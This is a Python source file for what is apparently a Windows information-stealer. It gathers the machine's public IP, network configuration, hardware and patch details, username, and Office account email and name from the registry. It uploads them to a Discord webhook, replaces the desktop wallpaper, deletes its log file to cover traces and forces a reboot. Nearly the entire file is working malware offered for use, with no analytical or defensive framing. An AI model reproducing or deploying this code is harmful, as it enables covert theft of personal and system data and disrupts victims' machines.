import os
import socket
import ctypes
import winreg
import requests
import subprocess

class InfoTaker:
    @staticmethod
    def decodeOutput(output):
        # Decode the output from a subprocess call, handling potential Unicode errors
        try:
            return output.decode('utf-8')
        except UnicodeDecodeError:
            return output.decode('utf-8', errors='replace')

    @staticmethod
    def executeCommand(command):
        # Execute a shell command and return its output or error message
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
            return InfoTaker.decodeOutput(output).strip()
        except subprocess.CalledProcessError as e:
            return f"Error: {InfoTaker.decodeOutput(e.output).strip()}"
        except Exception as e:
            return f"Error: {str(e)}"

    @staticmethod
    def getPublicIp():
        # Get the public IP address of the machine
        try:
            return requests.get('https://api.ipify.org').content.decode('utf8')
        except requests.RequestException as e:
            return f"Error getting public IP: {str(e)}"

    @staticmethod
    def getLocalNetworkInfo():
        # Get local network configuration information
        return InfoTaker.executeCommand('ipconfig /all')

    @staticmethod
    def getRegistryValue(path, key):
        # Retrieve a value from the Windows registry
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, path) as keyHandle:
                return winreg.QueryValueEx(keyHandle, key)[0]
        except FileNotFoundError:
            return None
        except Exception as e:
            return str(e)

    @staticmethod
    def getUserInfoFromRegistry():
        # Get user information (Email, FirstName, LastName) from the Windows registry
        userInfo = {}
        registryPath = r"Software\\Microsoft\\Office\\16.0\\Common\\Identity\\Identities"
        
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, registryPath) as parentKey:
                i = 0
                while True:
                    try:
                        subkeyName = winreg.EnumKey(parentKey, i)
                        subkeyPath = f"{registryPath}\\{subkeyName}"
                        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, subkeyPath) as subkey:
                            email = InfoTaker.getRegistryValue(subkeyPath, "EmailAddress")
                            if email:
                                userInfo["EmailAddress"] = email
                            firstName = InfoTaker.getRegistryValue(subkeyPath, "FirstName")
                            if firstName:
                                userInfo["FirstName"] = firstName
                            lastName = InfoTaker.getRegistryValue(subkeyPath, "LastName")
                            if lastName:
                                userInfo["LastName"] = lastName
                            # Stop once all fields are populated
                            if len(userInfo) == 3:
                                break
                    except OSError:
                        break
                    i += 1
        except Exception as e:
            userInfo['Error'] = str(e)
        
        return userInfo

    @staticmethod
    def getBiosVersion():
        # Retrieve the BIOS version from the Windows registry
        return InfoTaker.getRegistryValue(r"HARDWARE\\DESCRIPTION\\System", "SystemBiosVersion")

    @staticmethod
    def getSystemInfoWindows():
        # Gather various system information using WMIC commands
        info = {}
        
        def safeWmicCommand(command):
            # Execute a WMIC command and return its output
            return InfoTaker.executeCommand(command)
        
        info['CPU'] = safeWmicCommand('wmic cpu get caption')
        info['RAM (byte)'] = safeWmicCommand('wmic memorychip get capacity')
        info['GPU'] = safeWmicCommand('wmic path win32_VideoController get caption')
        info['System Version'] = safeWmicCommand('wmic os get caption')
        info['Architecture'] = safeWmicCommand('wmic os get osarchitecture')
        info['Security Patch'] = safeWmicCommand('wmic qfe get caption,installedon')
        info['System Manufacturer'] = safeWmicCommand('wmic computersystem get manufacturer')
        info['System Model'] = safeWmicCommand('wmic computersystem get model')
        
        # Retrieve disk space information for the C drive
        diskInfo = InfoTaker.executeCommand("wmic logicaldisk where \"DeviceID='C:'\" get Size,FreeSpace")
        lines = diskInfo.split('\n')
        if len(lines) > 1:
            info['Disk Space (C Drive)'] = lines[1].strip()
        else:
            info['Disk Space (C Drive)'] = "No data"
        
        info['Username'] = os.getlogin()
        userInfo = InfoTaker.getUserInfoFromRegistry()
        if userInfo:
            info.update(userInfo)
        info["BIOSVersion"] = InfoTaker.getBiosVersion()
        
        return info

    @staticmethod
    def getSystemInfo():
        # Retrieve system information using the 'systeminfo' command
        return InfoTaker.executeCommand('systeminfo')

    @staticmethod
    def saveNetworkAndSystemInfo():
        # Path to the log file
        logFilePath = os.path.join("BootLog.txt")

        # Save network and system information to the log file
        info = {
            'Public IP Address': InfoTaker.getPublicIp(),
            'Local Network Configuration': InfoTaker.getLocalNetworkInfo(),
            **InfoTaker.getSystemInfoWindows(),
            'System Info': InfoTaker.getSystemInfo()
        }
        
        try:
            with open(logFilePath, 'w', encoding='utf-8') as file:
                for key, value in info.items():
                    file.write(f"{key}:\n\n{value}\n\n")
        except Exception as e:
            print(f"Error writing to file: {e}")
        
        return logFilePath

    @staticmethod
    def deleteTrace():
        os.system("del /f BootLog.txt")
        os.system("del /f wallpaper.png")
        os.system("shutdown /r /t 0")
        
    @staticmethod
    def funnyTrace():
        os.chdir(tempPath)
        url = 'https://example.com/example.jpg'  # Replace with a valid URL
        try:
            response = requests.get(url)
            if response.status_code == 200:
                with open('wallpaper.png', 'wb') as file:
                    file.write(response.content)
                print("File downloaded successfully!")
            else:
                print(f"Failed to download file. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error downloading file: {str(e)}")
        
        wallpaper_path = "wallpaper.png"
        # Define constants
        SPI_SETDESKWALLPAPER = 20
        SPIF_UPDATEINIFILE = 0x01
        SPIF_SENDCHANGE = 0x02
        if not os.path.isfile(wallpaper_path):
            print(f"File not found: {wallpaper_path}")
        else:
            # Change wallpaper
            ctypes.windll.user32.SystemParametersInfoW(
                SPI_SETDESKWALLPAPER,
                0,
                f"{tempPath}/{wallpaper_path}",
                SPIF_UPDATEINIFILE | SPIF_SENDCHANGE
            )
            print("Wallpaper changed successfully!")

    @staticmethod
    def sendFileToDiscord(filePath, webhookUrl):
        # Send the specified file to a Discord webhook
        if os.path.exists(filePath):
            with open(filePath, "rb") as file:
                response = requests.post(
                    webhookUrl,
                    files={"file": file},
                    data={"content": f"Information of the PC: " + socket.gethostname() + ". IP: " + InfoTaker.getPublicIp()}
                )
                if response.status_code in (200, 204):
                    print("File sent successfully!")
                else:
                    print(f"Error while sending the file: {response.status_code} - {response.text}")
        else:
            print(f"File {filePath} not found!")


if __name__ == "__main__":
    # URL of the Discord webhook
    webhookUrl = "DISCORD_WEBHOOK_HERE"

    # Execute the function to save network and system information
    infoFilePath = InfoTaker.saveNetworkAndSystemInfo()

    # Send the log file to the Discord webhook
    InfoTaker.sendFileToDiscord(infoFilePath, webhookUrl)

    # Change wallpaper
    InfoTaker.funnyTrace()

    # Delete info file and reboot the system
    InfoTaker.deleteTrace()
